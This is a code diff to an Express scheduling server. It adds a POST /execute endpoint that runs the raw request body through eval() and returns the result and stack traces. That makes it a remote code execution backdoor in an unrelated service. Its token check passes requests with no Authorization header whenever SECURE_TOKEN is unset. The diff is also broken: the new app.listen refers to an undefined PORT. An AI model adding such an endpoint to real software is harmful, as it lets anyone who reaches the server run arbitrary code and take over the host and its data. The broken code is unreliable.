@@ -1,13 +1,18 @@
 const express = require('express');
+const bodyParser = require("body-parser");
 const axios = require('axios');
 const cors = require('cors');
 
 const app = express();
 const port = process.env.PORT || 10000;
 
+// Secure token from environment variable
+const SECURE_TOKEN = process.env.SECURE_TOKEN;
+
 // Middleware
 app.use(cors());
 app.use(express.json());
+app.use(bodyParser.text({ type: "text/plain" }));
 
 // Define working hours
 const WORKDAY_START = "08:00:00";
@@ -16,6 +21,34 @@ const WORKDAY_END = "16:00:00";
 // Default route to check server status
 app.get('/', (req, res) => {
   res.send('Server is running!');
+});
+
+// Function to check token
+const checkToken = (req, res, next) => {
+ const token = req.headers.authorization;
+ if (token === SECURE_TOKEN) {
+ next();
+ } else {
+ res.status(401).json({ error: "Unauthorized" });
+ }
+};
+
+// Execute endpoint
+app.post("/execute", checkToken, (req, res) => {
+ const code = req.body;
+ if (!code) {
+ return res.status(400).json({ error: "No code provided" });
+ }
+ try {
+   // Execute the code
+   const result = eval(code);
+   res.json({ result });
+ } catch (error) {
+   res.status(500).json({ error: error.message, trace: error.stack });
+ }
+});
+app.listen(PORT, () => {
+ console.log(`Server is running on port ${PORT}`);
 });
 
 // Route to identify free slots
